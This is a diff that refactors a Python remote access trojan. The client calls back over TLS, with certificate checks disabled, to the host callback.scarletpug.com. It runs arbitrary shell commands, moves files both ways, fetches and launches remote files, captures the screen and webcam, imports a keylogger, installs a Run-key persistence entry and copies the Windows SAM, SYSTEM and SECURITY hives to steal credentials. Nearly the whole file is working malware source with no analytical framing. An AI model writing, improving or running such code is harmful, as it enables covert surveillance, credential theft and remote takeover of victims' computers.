@@ -1,226 +1,199 @@
-import ctypes
-import cv2
-import json
 import os
+import sys
+import ssl
+import json
+import time
+import ctypes
 import shutil
 import socket
-import ssl
-import subprocess
-import sys
-import threading
-import time
-from sys import platform
+import struct
+import platform
 import requests
+import subprocess
 from mss import mss
-import keylogger
+import cv2
 
-# === Reliable Communication with Length Prefix Framing ===
+import keylogger  # assumed to exist
+
+# === CONFIGURATION ===
+SERVER_HOST = 'callback.scarletpug.com'
+SERVER_PORT = 443
+RECONNECT_DELAY = 5
+
+# === JSON Framed Socket I/O ===
 def recvall(sock, length):
     data = b''
     while len(data) < length:
-        try:
-            packet = sock.recv(length - len(data))
-            if not packet:
-                raise ConnectionError("[ERROR] Connection closed while receiving data")
-            data += packet
-        except socket.timeout:
-            print("[DEBUG] Socket timeout while waiting for data")
-            continue
+        packet = sock.recv(length - len(data))
+        if not packet:
+            raise ConnectionError("Socket closed unexpectedly during recvall")
+        data += packet
     return data
 
-def reliable_send(s, data):
+def reliable_send(sock, data):
     try:
-        jsondata = json.dumps(data)
-        encoded = jsondata.encode()
-        length = len(encoded)
-        print(f"[DEBUG] Sending message of length: {length}")
-        s.sendall(f"{length:<16}".encode())
-        s.sendall(encoded)
-        print(f"[DEBUG] Sent data: {jsondata}")
+        json_data = json.dumps(data).encode()
+        sock.sendall(f"{len(json_data):<16}".encode())  # 16-byte header
+        sock.sendall(json_data)
+        print(f"[DEBUG] Sent: {data}")
     except Exception as e:
-        print(f"[ERROR] Failed to send data: {e}")
+        print(f"[ERROR] Send failed: {e}")
 
-def reliable_recv(s):
+def reliable_recv(sock):
     try:
-        print("[DEBUG] Waiting for length header...")
-        length_data = recvall(s, 16)
-        msg_length = int(length_data.decode().strip())
-        print(f"[DEBUG] Expecting message of length: {msg_length}")
-        json_data = recvall(s, msg_length).decode()
-        print(f"[DEBUG] Received full JSON: {json_data}")
-        return json.loads(json_data)
-    except json.JSONDecodeError as e:
-        print(f"[ERROR] JSON decode failed: {e}")
-        return None
+        header = recvall(sock, 16)
+        length = int(header.decode().strip())
+        payload = recvall(sock, length)
+        data = json.loads(payload.decode())
+        print(f"[DEBUG] Received: {data}")
+        return data
     except Exception as e:
-        print(f"[ERROR] Failed to receive data: {e}")
+        print(f"[ERROR] Receive failed: {e}")
         return None
 
-# === File Transfer ===
-def download_file(s, file_name):
-    print(f"[DEBUG] Starting download to {file_name}")
+# === Command Execution Features ===
+def download_file(sock, file_name):
+    print(f"[DEBUG] Downloading to {file_name}")
     with open(file_name, 'wb') as f:
-        s.settimeout(2)
-        while True:
-            try:
-                chunk = s.recv(1024)
+        sock.settimeout(2)
+        try:
+            while True:
+                chunk = sock.recv(1024)
                 if not chunk:
                     break
                 f.write(chunk)
-            except socket.timeout:
-                break
-        s.settimeout(None)
-    print("[DEBUG] File download complete")
+        except socket.timeout:
+            pass
+        finally:
+            sock.settimeout(None)
 
-def upload_file(s, file_name):
-    print(f"[DEBUG] Uploading file: {file_name}")
+def upload_file(sock, file_name):
+    print(f"[DEBUG] Uploading {file_name}")
     with open(file_name, 'rb') as f:
-        s.sendall(f.read())
-    print("[DEBUG] File upload complete")
+        sock.sendall(f.read())
 
-# === Features ===
 def download_url(url):
-    print(f"[DEBUG] Downloading from URL: {url}")
-    get_response = requests.get(url)
     file_name = url.split('/')[-1]
-    with open(file_name, 'wb') as out_file:
-        out_file.write(get_response.content)
-    print(f"[DEBUG] Saved as {file_name}")
+    r = requests.get(url, timeout=10)
+    with open(file_name, 'wb') as f:
+        f.write(r.content)
+    print(f"[DEBUG] Downloaded {file_name} from {url}")
+    return file_name
 
 def screenshot():
-    print("[DEBUG] Taking screenshot")
-    with mss(display=":0.0" if platform.startswith("linux") else None) as screen:
-        filename = screen.shot()
-        os.rename(filename, '.screen.png')
-        print("[DEBUG] Screenshot saved")
+    with mss(display=":0.0" if platform.system() == "Linux" else None) as sct:
+        output = '.screen.png'
+        sct.shot(output=output)
+        return output
 
 def capture_webcam():
-    print("[DEBUG] Attempting to capture webcam")
-    webcam = cv2.VideoCapture(0)
-    webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
-    if not webcam.isOpened():
-        print("[ERROR] Webcam not available")
-        return
-    ret, frame = webcam.read()
-    webcam.release()
-    if ret:
-        _, buffer = cv2.imencode(".webcam.png", frame)
-        with open('.webcam.png', 'wb') as f:
-            f.write(buffer.tobytes())
-        print("[DEBUG] Webcam capture complete")
-    else:
-        print("[ERROR] Webcam read failed")
+    cam = cv2.VideoCapture(0)
+    if not cam.isOpened():
+        return None
+    ret, frame = cam.read()
+    cam.release()
+    if not ret:
+        return None
+    path = '.webcam.png'
+    _, buffer = cv2.imencode('.png', frame)
+    with open(path, 'wb') as f:
+        f.write(buffer.tobytes())
+    return path
 
-def persist(s, reg_name, copy_name):
-    file_location = os.environ['appdata'] + '\\' + copy_name
-    try:
-        if not os.path.exists(file_location):
-            shutil.copyfile(sys.executable, file_location)
-            subprocess.call(
-                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {reg_name} /t REG_SZ /d "{file_location}"',
-                shell=True)
-            reliable_send(s, '[+] Created Persistence With Reg Key: ' + reg_name)
-        else:
-            reliable_send(s, '[+] Persistence Already Exists')
-    except Exception as e:
-        print(f"[ERROR] Persistence failed: {e}")
-        reliable_send(s, '[-] Error Creating Persistence With The Target Machine')
+def persist(reg_name, copy_name):
+    location = os.environ['APPDATA'] + '\\' + copy_name
+    if not os.path.exists(location):
+        shutil.copyfile(sys.executable, location)
+        subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {reg_name} /d "{location}" /f', shell=True)
+        return f"[+] Persistence created: {reg_name}"
+    return "[+] Persistence already exists"
 
 def is_admin():
     try:
-        temp = os.listdir(os.path.join(os.environ.get('SystemRoot', r'C:\windows'), 'temp'))
-        return True
+        return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
 
 def get_sam_dump():
     if not is_admin():
-        return "You must run this function as an Administrator."
+        return "[!!] Admin required for SAM dump"
     try:
-        with open(r'C:\Windows\System32\config\SAM', 'rb') as sam_file,
-             open(r'C:\Windows\System32\config\SYSTEM', 'rb') as system_file,
-             open(r'C:\Windows\System32\config\SECURITY', 'rb') as security_file:
-            return sam_file.read(), system_file.read(), security_file.read()
+        with open(r'C:\Windows\System32\config\SAM', 'rb') as sam, \
+             open(r'C:\Windows\System32\config\SYSTEM', 'rb') as system, \
+             open(r'C:\Windows\System32\config\SECURITY', 'rb') as security:
+            return sam.read(), system.read(), security.read()
     except Exception as e:
-        return f"[ERROR] Could not access registry hives: {e}"
+        return f"[ERROR] Could not access hives: {e}"
 
-# === Command Loop ===
-def shell(s):
+# === Main Shell Loop ===
+def shell(sock):
     while True:
-        command = reliable_recv(s)
+        command = reliable_recv(sock)
         if not command:
-            print("[DEBUG] Empty command, breaking")
             break
-        print(f"[DEBUG] Received command: {command}")
         try:
             if command == 'quit':
                 break
             elif command.startswith('cd '):
                 os.chdir(command[3:])
             elif command.startswith('upload '):
-                download_file(s, command[7:])
+                download_file(sock, command[7:])
             elif command.startswith('download '):
-                upload_file(s, command[9:])
+                upload_file(sock, command[9:])
             elif command.startswith('get '):
-                download_url(command[4:])
-                reliable_send(s, '[+] File downloaded')
+                file = download_url(command[4:])
+                reliable_send(sock, f"[+] Downloaded {file}")
             elif command == 'screenshot':
-                screenshot()
-                upload_file(s, '.screen.png')
-                os.remove('.screen.png')
+                path = screenshot()
+                upload_file(sock, path)
+                os.remove(path)
             elif command == 'webcam':
-                capture_webcam()
-                upload_file(s, '.webcam.png')
-                os.remove('.webcam.png')
+                path = capture_webcam()
+                if path:
+                    upload_file(sock, path)
+                    os.remove(path)
+                else:
+                    reliable_send(sock, "[ERROR] Webcam unavailable")
             elif command.startswith('persistence '):
-                reg, name = command[12:].split(' ')
-                persist(s, reg, name)
+                reg, exe = command[12:].split()
+                msg = persist(reg, exe)
+                reliable_send(sock, msg)
             elif command == 'check':
-                reliable_send(s, '[+] Admin Privileges' if is_admin() else '[!!] Not Admin')
+                reliable_send(sock, '[+] Admin Privileges' if is_admin() else '[!!] Not Admin')
             elif command.startswith('start '):
                 subprocess.Popen(command[6:], shell=True)
-                reliable_send(s, '[+] Started')
+                reliable_send(sock, '[+] Process started')
             elif command == 'get_sam_dump':
                 data = get_sam_dump()
-                reliable_send(s, data)
+                reliable_send(sock, data)
             else:
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                output = proc.stdout.read() + proc.stderr.read()
-                reliable_send(s, output.decode())
+                out, err = proc.communicate()
+                reliable_send(sock, (out + err).decode())
         except Exception as e:
-            print(f"[ERROR] Command failed: {e}")
-            reliable_send(s, f"[ERROR] {e}")
+            print(f"[ERROR] Shell command error: {e}")
+            reliable_send(sock, f"[ERROR] {e}")
 
-# === Connection ===
-def handshake(s):
-    try:
-        reliable_send(s, {"status": "connected", "platform": platform})
-        print("[DEBUG] Handshake sent")
-    except Exception as e:
-        print(f"[ERROR] Handshake failed: {e}")
+# === TLS Connection + Handshake ===
+def handshake(sock):
+    reliable_send(sock, {"status": "connected", "platform": platform.system()})
+    print("[DEBUG] Handshake sent")
 
 def connection():
-    host = 'callback.scarletpug.com'
-    port = 443
     context = ssl.create_default_context()
     context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
+
     while True:
         try:
-            print(f"[DEBUG] Attempting connection to {host}:{port}")
-            raw_socket = socket.create_connection((host, port))
-            s = context.wrap_socket(raw_socket, server_hostname=host)
-            print("[+] Connected to server over TLS")
-            handshake(s)
-            shell(s)
-            s.close()
-            break
+            print(f"[DEBUG] Connecting to {SERVER_HOST}:{SERVER_PORT}")
+            with socket.create_connection((SERVER_HOST, SERVER_PORT)) as raw_sock:
+                with context.wrap_socket(raw_sock, server_hostname=SERVER_HOST) as sock:
+                    print("[+] Connected over TLS")
+                    handshake(sock)
+                    shell(sock)
         except Exception as e:
-            print(f"[ERROR] Connection failed: {e}")
-            try:
-                s.close()
-            except:
-                pass
-            time.sleep(5)
+            print(f"[ERROR] Connection error: {e}")
+            time.sleep(RECONNECT_DELAY + int.from_bytes(os.urandom(1), 'little') % 5)
 
 connection()
